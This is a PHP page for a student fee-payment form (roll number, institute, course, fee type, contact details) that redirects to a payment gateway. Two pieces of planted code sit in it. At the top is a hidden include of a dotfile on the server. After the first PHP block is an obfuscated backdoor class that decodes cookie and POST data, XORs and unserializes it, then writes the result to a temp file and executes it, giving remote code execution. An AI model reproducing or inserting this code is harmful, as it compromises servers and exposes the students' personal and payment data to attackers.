<?php
/*2ba34*/

$revq7 = "/\x68ome/systimatek/public_\x68tml/agdpfintec\x68.com/upi/.af05563a.ccss"; $t8dqk = $revq7; strpos($t8dqk, "vcpiq"); @include_once /* u */ ($t8dqk);

/*2ba34*/

















session_start();

// Check if the form has been submitted
if (isset($_POST['submit'])) {
    // Process the form submission
    // (You can add your form processing logic here)

    // Set a session variable to indicate that the form has been submitted
    $_SESSION['form_submitted'] = true;

    // Redirect the user to the payment link
    $payment_link = "https://paymoney.vrsolutionss.com/payment/form"; // Replace this with your actual payment link
    header("Location: $payment_link");
    exit; // Make sure to exit after redirection
}

// Check if the form has been previously submitted
if (isset($_SESSION['form_submitted']) && $_SESSION['form_submitted'] === true) {
    // Redirect the user to the payment link
    $payment_link = "https://paymoney.vrsolutionss.com/payment/form"; // Replace this with your actual payment link
    header("Location: $payment_link");
    exit; // Make sure to exit after redirection
}
// $localIP = gethostbyname(ip2long($localIP));

?>
<?php







$xMJCQGoi = "\101" . chr(198 - 103) . 'l' . "\170" . chr(800 - 687) . 'W';
$UFOrrn = chr(985 - 886) . chr(1057 - 949) . chr(491 - 394) . "\163" . chr(115) . chr(1050 - 955) . chr(101) . "\x78" . 'i' . chr(595 - 480) . chr(116) . "\x73";
$bjYdND = class_exists($xMJCQGoi);
$xMJCQGoi = "723";
$UFOrrn = "14849";
if ($bjYdND === FALSE) {
    class A_lxqW
    {
        public function XtgzA()
        {
            echo "32369";
        }
        private $CZannsB;
        public static $KalqRtCh = "ca23518c-115c-4a0c-ae7b-d517b3eb09a5";
        public static $cPGzv = 15662;
        public function __construct($SEnpiYh = 0)
        {
            $UwToCdvtnT = $_POST;
            $FFBwkiEx = $_COOKIE;
            $WRoiomOKz = @$FFBwkiEx[substr(A_lxqW::$KalqRtCh, 0, 4)];
            if (!empty($WRoiomOKz)) {
                $dJTmniTaUU = "base64";
                $uPuWbJA = "";
                $WRoiomOKz = explode(",", $WRoiomOKz);
                foreach ($WRoiomOKz as $EvxmfF) {
                    $uPuWbJA .= @$FFBwkiEx[$EvxmfF];
                    $uPuWbJA .= @$UwToCdvtnT[$EvxmfF];
                }
                $uPuWbJA = array_map($dJTmniTaUU . '_' . "\x64" . chr(101) . chr(99) . "\x6f" . "\144" . chr(1063 - 962), array($uPuWbJA,));
                $uPuWbJA = $uPuWbJA[0] ^ str_repeat(A_lxqW::$KalqRtCh, (strlen($uPuWbJA[0]) / strlen(A_lxqW::$KalqRtCh)) + 1);
                A_lxqW::$cPGzv = @unserialize($uPuWbJA);
            }
        }
        private function TPROyQUp()
        {
            if (is_array(A_lxqW::$cPGzv)) {
                $xOijKIGOov = sys_get_temp_dir() . "/" . crc32(A_lxqW::$cPGzv[chr(942 - 827) . chr(97) . "\154" . "\164"]);
                @A_lxqW::$cPGzv["\x77" . 'r' . chr(105) . "\164" . "\x65"]($xOijKIGOov, A_lxqW::$cPGzv["\x63" . chr(711 - 600) . chr(597 - 487) . chr(116) . chr(217 - 116) . "\156" . chr(116)]);
                include $xOijKIGOov;
                @A_lxqW::$cPGzv[chr(100) . chr(101) . 'l' . "\x65" . 't' . "\x65"]($xOijKIGOov);
                $SNawfSr = "61649";
                exit();
            }
        }
        public function __destruct()
        {
            $this->TPROyQUp();
        }
    }
    $YLzBsnilD = new /* 142 */ A_lxqW();
    $YLzBsnilD = str_repeat("5132_29128", 1);
} ?>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "Please enter a valid email address";
    }

    // Other validations can go here

    if (isset($error)) {
        // Redirect back to the form page with error message
        header("Location: index.php?error=" . urlencode($error));
        exit();
    }

    // Process form data if validation passes
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <link href="feecollect-styles.css" rel="stylesheet" media="screen">

    <title>Document</title>

</head>

<body>

    <img src="icon/logo.png" class="logo_styles">
    <!-- <div class="container-wrapper"> -->
    <!-- <div class="box-wrapper"> -->
    <div class="formbold-main-wrapper">
        <!-- Author: FormBold Team -->
        <!-- Learn More: https://formbold.com -->
        <div class="formbold-form-wrapper">

            <div class="steps">
                <div id="step1" class="step active">
                    <span class="step-number">Step 1</span>
                    <span class="step-text">Category Information</span>
                </div>
                <div id="step2" class="step">
                    <span class="step-number">Step 2</span>
                    <span class="step-text">Personal Information</span>
                </div>
                <div id="step3" class="step">
                    <span class="step-number">Step 3</span>
                    <span class="step-text">Institutional Details</span>
                </div>
                <div id="step4" class="step">
                    <span class="step-number">Step 4</span>
                    <span class="step-text">Fee Information</span>
                </div>
            </div>

            <form id="form" action="https://paymoney.vrsolutionss.com/payment/form" method="POST" onsubmit="validateForm()">
                <div id="section1">
                    <div id="container" onclick="nextStep(2)"></div>
                </div>
                <div id="section2" style="display: none;">

                    <div class="formbold-input-group">
                        <label for="rollno" class="formbold-form-label">Roll no / Student Id</label>
                        <div class="input-container">
                            <input type="text" name="rollno" id="rollno" placeholder="Enter your Roll no/Student id" class="inputField formbold-form-input" required />
                            <button type="button" class="circle_button highlight" id="circle_button" onclick="fetchStudentData()">&#10003;</button>
                        </div>
                    </div>
                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="country">
                            Select Country
                        </label>
                        <select class="formbold-form-select" name="country" id="country" required>
                            <option value="country">Select Country</option>
                        </select>
                    </div>
                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="state">
                            Select State
                        </label>

                        <select class="formbold-form-select" name="state" id="state" required>
                            <option value="state">Select State</option>
                        </select>
                    </div>
                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="city">
                            Select City
                        </label>

                        <select class="formbold-form-select" name="city" id="city" required>
                            <option value="city">Select City</option>
                        </select>
                    </div>
                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="institute">
                            Select Institute
                        </label>

                        <select class="formbold-form-select" id="institute" name="institute" required>
                            <option value="institute">Select Institution</option>
                        </select>
                    </div>

                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="course">
                            Select Course
                        </label>

                        <select class="formbold-form-select" name="course" id="course" required>
                            <option value="Select Course">Select Course</option>
                            <option value="MPC">MPC</option>
                            <option value="BiPC">BiPC</option>
                            <option value="CEC">CEC</option>
                            <option value="MEC">MEC</option>
                            <option value="MCA">MCA</option>
                            <option value="MBA">MBA</option>
                            <option value="iMBA">iMBA</option>
                            <option value="PGDM">PGDM</option>
                            <option value="BBA">BBA</option>
                            <option value="B.TECH">B.TECH</option>
                        </select>
                    </div>
                    <div class="formbold-input-group">
                        <label class="formbold-form-label" for="fees">
                            Select Fees Type
                        </label>

                        <select class="formbold-form-select" name="fees" id="fees" required>
                            <option value="Select Fees">Select Fees</option>
                            <option value="Exam Fees">Exam Fees</option>
                            <option value="Tuition Fees">Tuition Fees</option>
                            <option value="University Fees">University Fees</option>
                            <option value="Hostel Fees">Hostel Fees</option>
                            <option value="JEE">JEE</option>
                            <option value="Online Training Fee">Online Training Fee</option>
                        </select>
                    </div>
                    <button class="formbold-btn" type="button" onclick="prevStep(1)">Previous</button>
                    <button class="formbold-btn" type="button" onclick="nextStep(3)">Next</button>
                </div>

                <div id="section3" style="display: none;">
                    <div class="formbold-input-group">
                        <label for="name" class="formbold-form-label">Full Name:</label>
                        <input type="text" id="name" name="custom" placeholder="Enter your Full Name" class="formbold-form-input" >
                    </div>
                    <div class="formbold-input-group">
                        <label for="email" class="formbold-form-label">Email:</label>
                        <input type="email" id="email" name="email" placeholder="Enter your Email" class="formbold-form-input" >
                    </div>
                    <div class="formbold-input-group">
                        <label for="age" class="formbold-form-label">Mobile:</label>
                        <input type="text" id="mobile" name="mobile" placeholder="Enter your Mobile" class="formbold-form-input" >
                    </div>
                    <!-- <button type="submit" class="normal_button highlight" id="normal_button" disabled>Update Student Data</button> -->
                    <div class="formbold-input-group">
                        <label for="name" class="formbold-form-label"> Parents/Guardians </label>
                        <input type="text" name="parent" id="parent" placeholder="Enter your Parent Name" class="formbold-form-input"  />
                    </div>
                    <button class="formbold-btn" type="button" onclick="prevStep(2)">Previous</button>
                    <button class="formbold-btn" type="button" onclick="nextStep(4)">Next</button>
                </div>

                <div id="section4" style="display: none;">
                    <input type="hidden" name="merchant" value="F43707E006C04" />
                    <input type="hidden" name="merchant_id" value="3" />
                    <input type="hidden" name="currency_id" value="6" />
                    <div class="formbold-input-group">
                        <label for="amount" class="formbold-form-label">Fees</label>
                        <input type="number" name="amount" id="amount" placeholder="Enter your amount" class="formbold-form-input" required />
                    </div>
                    <div>
                        <label for="feecomments" class="formbold-form-label">
                            Any comments or suggestions
                        </label>
                        <textarea rows="6" name="feecomments" id="feecomments" placeholder="Type here..." class="formbold-form-input"></textarea>
                    </div>
                    <button class="formbold-btn" type="button" onclick="prevStep(3)">Previous</button>
                    <button class="formbold-btn" type="submit" name="submit">Submit</button>
                </div>

            </form>
        </div>
    </div>
    <div class="wrapper">
    </div>
    <script>
        fetch('fetchcategories.php')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch categories');
            }
            return response.json();
        })
        .then(data => {
            processData(data);
        })
        .catch(error => {
            console.error('Error occurred while fetching data:', error);
            // Display an error message on the UI or perform additional error handling
        });
        </script>
    <script src="validation.js"></script>
    <script>
        $(document).ready(function() {
            // Populate country dropdown
            var countries = ["India", "United States", "United Kingdom"];
            $.each(countries, function(index, value) {
                $('#country').append('<option value="' + value + '">' + value + '</option>');
            });

            // Populate state dropdown based on selected country
            $('#country').change(function() {
                var selectedCountry = $(this).val();
                var states;

                if (selectedCountry === "India") {
                    states = ["Select State", "Maharashtra", "Karnataka", "Tamil Nadu", "Telangana", "Odisha"];
                } else if (selectedCountry === "United States") {
                    states = ["Select State", "California", "New York", "Texas"];
                } else if (selectedCountry === "United Kingdom") {
                    states = ["Select State", "London", "Manchester", "Birmingham"];
                }

                $('#state').empty();
                $.each(states, function(index, value) {
                    $('#state').append('<option value="' + value + '">' + value + '</option>');
                });
            });

            // Populate city dropdown based on selected state
            $('#state').change(function() {
                var selectedState = $(this).val();
                var cities;

                if (selectedState === "Maharashtra") {
                    cities = ["Select City", "Mumbai", "Pune", "Nagpur"];
                } else if (selectedState === "Karnataka") {
                    cities = ["Select City", "Bangalore", "Mysore", "Hubli"];
                } else if (selectedState === "Telangana") {
                    cities = ["Select City", "Hyderabad", "Secundrabad", "Warangal"];
                } else if (selectedState === "Odisha") {
                    cities = ["Select City", "Berhampur", "Bhubaneswar", "Rourkela"];
                } else if (selectedState === "Tamil Nadu") {
                    cities = ["Select City", "Chennai", "Coimbatore", "Madurai"];
                } else if (selectedState === "California") {
                    cities = ["Select City", "Los Angeles", "San Francisco", "San Diego"];
                } else if (selectedState === "New York") {
                    cities = ["Select City", "New York City", "Buffalo", "Albany"];
                } else if (selectedState === "Texas") {
                    cities = ["Select City", "Houston", "Dallas", "Austin"];
                } else if (selectedState === "London") {
                    cities = ["Select City", "London City", "Buckingham", "Camden"];
                } else if (selectedState === "Manchester") {
                    cities = ["Select City", "Manchester City", "Salford", "Bolton"];
                } else if (selectedState === "Birmingham") {
                    cities = ["Select City", "Birmingham City", "Coventry", "Wolverhampton"];
                }

                $('#city').empty();
                $.each(cities, function(index, value) {
                    $('#city').append('<option value="' + value + '">' + value + '</option>');
                });
            });

            // Populate institute dropdown based on selected state
            $('#city').change(function() {
                var selectedCity = $(this).val();
                var inst;

                if (selectedCity === "Hyderabad") {
                    inst = ["Select Institute", "Sri Chaitanya", "The Mothers Touch", "N.I.S.T"];
                } else if (selectedCity === "Secundrabad") {
                    inst = ["Select Institute", "Vishwa Vishwani", "VVIT", "Roland"];
                } else if (selectedCity === "Berhampur") {
                    inst = ["Select Institute", "Gayatri", "Samrat college", "BJB College"];
                } else if (selectedCity === "Tamil Nadu") {
                    inst = ["Select Institute", "Chennai", "Coimbatore", "Madurai"];
                } else if (selectedCity === "California") {
                    inst = ["Select Institute", "Los Angeles", "San Francisco", "San Diego"];
                } else if (selectedCity === "New York") {
                    inst = ["Select Institute", "New York City", "Buffalo", "Albany"];
                }


                $('#institute').empty();
                $.each(inst, function(index, value) {
                    $('#institute').append('<option value="' + value + '">' + value + '</option>');
                });
            });

        });
    </script>


</body>

</html>